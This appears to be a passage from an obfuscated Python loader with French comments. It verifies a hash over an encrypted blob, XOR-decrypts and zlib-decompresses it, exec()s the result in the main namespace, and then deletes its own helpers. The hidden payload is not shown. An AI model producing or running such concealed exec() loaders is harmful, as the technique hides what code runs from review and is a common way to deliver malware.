_cnrHdqnUWMs6bI + _cct_BoEYSok4C6 + _czRtGQdd2yFEs4 + _cdKp2de4PDjY2T + _cruBaxZnPE7z_b + _csG4Ye6pgy2U9n + _coJun9IjSPK5bz + _ckZOEFkf5lgHOU + _chsBH6e4juLy6L + _cqA5ZAw7fRR26z + _cfs5l5QYXnke28 + _ceda5a4lLLHWbw + _cfGV2grrHOjb3q + _cwvqNNRUS4flf_ + _chCOsOTZtctOua + _cy15mKBAxG4NmZ + _crH4phrGVsp_9Z + _cnYhWt4IJZ8tJB + _cx8LFr7b0fECJg + _cuihXAtrlREOwY + _cvzJbZOYXTbysv + _cuGg3XXkDl11oM + _cvz0MkFemBEXWw + _chZEnwLGn3hyNN + _cjkWo7Y4FZbcOu + _cw7uFR_JbJWZoo + _cwY1EdLJqbWSwk + _csO71jXBmB_y29 + _czCR9OzA2uYRxQ + _c_tHqbxP3J3dAM + _cjuNYmD3QhPEFu + _cs_TBKNcVY6S_O + _ceHPPLrAmjX7_O + _cr9LwlS7IVYg3N + _cw3fb1LHylasDF + _cwFfNtLKm0OQEy + _cjgi5jPAUVDjMI + _cqI6ljnpV2EoCO + _cj6CDP9ZusnmD8 + _cqbyDqtPdQ0jk7 + _ctQ2QojEg_bI5J + _chzMXzhuApkP4x + _cpFCi0FmnRux2f + _cdIyfylf0sHxi5 + _cg0eWLR_4dbC7U + _cn7pNysYQ8lCPZ + _coKOGLUYMXg9Lx + _czattMxNZ5W7OL + _cf8WqIpqCre7Zr + _csKP0xPxfqlV42 + _coDR_dF8AxyYrf + _cjZlQYhyOtJLEz + _carnqd3RNuTI6K + _cxON2Dv2NSxrMM + _cvFNvLSzcIRWR_ + _cxVKyu9AeGC1Fq + _ccEod2T_qFafT1 + _cdQATdyXgS0MoG + _chYMo3Gd4v4iGl + _cvy0Wi4_wuaPzf + _cec53NHG2BE_x9 + _cpSnNBsc8yvTW3 + _cnwfM8g3cBAOVy + _cdXSKiqDAhWbj_ + _ca84LlsScSci16 + _cmN5IusETTWre2 + _cycBdiJkvouE9c + _cfNwEULXOwyvry + _c_q_dzacGW0rJn + _cvh2HlsW_7vZTj + _ci0FMlssz_Thvl + _cjkJerQskLMp9O + _ccRleF1Ud9UO7g + _cm2_nBKR1FlpQ6 + _czaK0L65mImp4C + _cw2KjHyqXA7Oux + _cn4Zd1bvNO7Zux + _ccay7xiQpfWNyk + _caREZsz7ZqHGUV + _cqnfaeb6nevDR2 + _csL1ttMQ76Ummu + _cqhmUvKjxxskza + _cffUkhFiQbloOi + _ci86zncfw0p2xG + _czKar98Jb99jBE + _czZqwvKdWLF7l5)
if __import__('hashlib').sha256(_pveJ6cyW5TErVx).hexdigest() != '0dc9ae3cfaa5baca750bfef782c2dcb68515e34ca6534b583b6a7ceadf103bff':
    __import__('sys').exit(1)
_xuMuesXOZZwnTP = bytes([92, 71, 59, 220, 43, 22, 134, 133, 211, 152, 209, 202, 98, 137, 23, 176, 107, 9, 92, 134, 74, 144, 255, 191, 164, 23, 127, 164])
_fkrBzRoMlw7nxJT = bytes([50, 192, 113, 181, 214, 145, 243, 117, 8, 251, 235, 255, 190, 185, 196, 250, 190, 215, 25, 110, 239, 57, 253, 86, 208, 115, 72, 162])

def _fxlg9ZlMWK7MmLG(_bqaMoYoX5GpPaY, _knS23qbVqQmA97):
    return bytes(_bqaMoYoX5GpPaY[_ilyUKB2Q5bf5iW] ^ _knS23qbVqQmA97[_ilyUKB2Q5bf5iW % len(_knS23qbVqQmA97)] for _ilyUKB2Q5bf5iW in range(len(_bqaMoYoX5GpPaY)))

def _fdoMyhrBtEfbeJf(_thADSTATSrseXv):
    import zlib
    return zlib.decompress(_thADSTATSrseXv) # Un seul niveau de zlib ici pour simplifier

def _fevPPVs7XQl4HUy():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xoxkMCYJN6DwUy = _fxlg9ZlMWK7MmLG(_pveJ6cyW5TErVx, _xuMuesXOZZwnTP)
    # 2. Décompression Zlib
    _dd80g512wy0U2O = _fdoMyhrBtEfbeJf(_xoxkMCYJN6DwUy)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dd80g512wy0U2O.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nuptvfHW7wpXuB = _main.__dict__
    _nuptvfHW7wpXuB.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nuptvfHW7wpXuB)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fevPPVs7XQl4HUy()
try:
    del _fxlg9ZlMWK7MmLG, _fdoMyhrBtEfbeJf, _fevPPVs7XQl4HUy
    del _pveJ6cyW5TErVx, _xuMuesXOZZwnTP, _fkrBzRoMlw7nxJT
except:
    pass
